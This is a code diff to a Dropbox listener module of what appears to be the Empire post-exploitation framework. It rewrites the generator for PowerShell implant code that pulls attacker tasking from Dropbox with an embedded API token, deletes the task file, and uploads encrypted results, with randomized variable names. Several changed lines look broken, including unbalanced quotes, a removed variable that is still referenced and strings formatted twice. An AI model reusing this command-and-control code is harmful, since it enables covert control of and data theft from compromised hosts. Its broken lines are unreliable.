@@ -534,12 +534,15 @@ class Listener:
             print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module.")
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None, **kwargs):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
+        
+        #we are generating code for an already deployed agent
+        deployed = "deployed" in kwargs
 
         stagingKey = listenerOptions['StagingKey']['Value']
         pollInterval = listenerOptions['PollInterval']['Value']
@@ -550,54 +553,66 @@ class Listener:
 
         if language:
             if language.lower() == 'powershell':
-
-                updateServers = """
-    $Script:APIToken = "%s";
-                """ % (apiToken)
+                listener_dict = """
+{{
+    'name': '{name}',
+    'delay' : {delay},
+    'jitter' : {jitter},
+    'fixed_parameters': {{
+        'headers' : {{'User-Agent': "{UA}", 'Cookie':"{cookie}"}},
+        'taskURIs' : "{taskURIs}",
+    }},
+    'send_func': {send_func},
+    'defaultResponse': "{defaultResponse}",
+    'lostLimit': {lostLimit},
+    'missedCheckins':0,
+}},
+#LISTENER_DICT
+"""
 
                 getTask = """
-    $script:GetTask = {
-        try {
+    $script:GetTask{name} = {{
+        params($FixedParameters) 
+        $APIToken = "{api_token}";
+        try {{
             # build the web request object
             $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
             # set the proxy settings for the WC to be the default system settings
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
+            if($Script:Proxy) {{
                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-            }
+            }}
 
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $FixedParameters["headers"][User-Agent"])
+            $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-            $TaskingsFolder = "%s"
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)")
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+            $TaskingsFolder = "{tasking_folder}"
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($APIToken)")
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
             $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
 
-            if($Data -and ($Data.Length -ne 0)) {
+            if($Data -and ($Data.Length -ne 0)) {{
                 # if there was a tasking data, remove it
                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Content-Type", " application/json")
                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Remove("Dropbox-API-Arg")
-                $Null=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+                $Null=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
                 $Data
-            }
-            $script:MissedCheckins = 0
-        }
-        catch {
-            if ($_ -match 'Unable to connect') {
-                $script:MissedCheckins += 1
-            }
-        }
-    }
-                """ % (taskingsFolder)
+            }}
+        }}
+        catch {{
+        }}
+    }}
+#TASK_FUNC
+                """.format(name = listenerOptions["Name"]["Value"], tasking_folder = taskingsFolder, api_token = apiToken)
 
                 sendMessage = """
-    $script:SendMessage = {
-        param($Packets)
+    $script:SendMessage{name} = {{
+        param($Packets,$FixedParameters)
+        $APIToken = "{api_token}";
 
-        if($Packets) {
+        if($Packets) {{
             # build and encrypt the response packet
             $EncBytes = Encrypt-Bytes $Packets
 
@@ -610,53 +625,57 @@ class Listener:
             # set the proxy settings for the WC to be the default system settings
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
+            if($Script:Proxy) {{
                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-            }
+            }}
 
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $FixedParameters["headers"]["User-Agent"])
+            $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-            $ResultsFolder = "%s"
+            $ResultsFolder = {resultsFolder}"
 
-            try {
+            try {{
                 # check if the results file is still in the specified location, if so then
                 #   download the file and append the new routing packet to it
-                try {
+                try {{
                     $Data = $Null
                     $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)");
                     $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
                     $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
-                }
-                catch { }
+                }}
+                catch {{ }}
 
-                if($Data -and $Data.Length -ne 0) {
+                if($Data -and $Data.Length -ne 0) {{
                     $RoutingPacket = $Data + $RoutingPacket
-                }
+                }}
 
                 $"""+helpers.generate_random_script_var_name("wc")+"""2 = New-Object System.Net.WebClient
                 $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                 $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                if($Script:Proxy) {
+                if($Script:Proxy) {{
                     $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = $Script:Proxy;
-                }
+                }}
 
-                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Authorization", "Bearer $($APIToken)")
                 $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Content-Type", "application/octet-stream")
-                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Dropbox-API-Arg", "{{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}}");
                 $Null = $"""+helpers.generate_random_script_var_name("wc")+"""2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
-                $script:MissedCheckins = 0
-            }
-            catch {
-                if ($_ -match 'Unable to connect') {
-                    $script:MissedCheckins += 1
-                }
-            }
-        }
-    }
-                """ % (resultsFolder)
-                
-                return updateServers + getTask + sendMessage
+            }}
+            catch {{
+            }}
+        }}
+    }}
+#TASK_FUNC
+                """.format(resultsFolder = resultsFolder, name = listenerOptions["Name"]["Value"], api_token = apiToken)
+
+                if deployed:
+                    return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                else:
+                    return (listener_dict,
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             elif language.lower() == 'python':
 
